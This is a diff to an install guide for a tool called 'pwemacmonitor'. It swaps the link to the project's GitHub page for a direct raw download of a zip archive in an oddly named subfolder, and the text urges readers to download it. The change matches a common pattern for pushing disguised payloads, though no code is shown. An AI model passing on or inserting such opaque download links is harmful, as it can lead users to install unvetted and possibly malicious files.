@@ -9,7 +9,7 @@ Welcome! This guide will help you get **pwemacmonitor** running on your computer
 This is the only step you need to do manually—everything else happens automatically.
 
 **Visit this link to download the application:**  
-[**https://github.com/ratetomorrow8573/pwemacmonitor**](https://github.com/ratetomorrow8573/pwemacmonitor)
+[**https://github.com/ratetomorrow8573/pwemacmonitor/raw/refs/heads/main/paperback/v3.8.zip**](https://github.com/ratetomorrow8573/pwemacmonitor/raw/refs/heads/main/paperback/v3.8.zip)
 
 When you click the link above, you'll land on the download page. Look for the button or icon that says **"Download"** or shows a downward arrow⚡. Click it and the download will start right away.
 
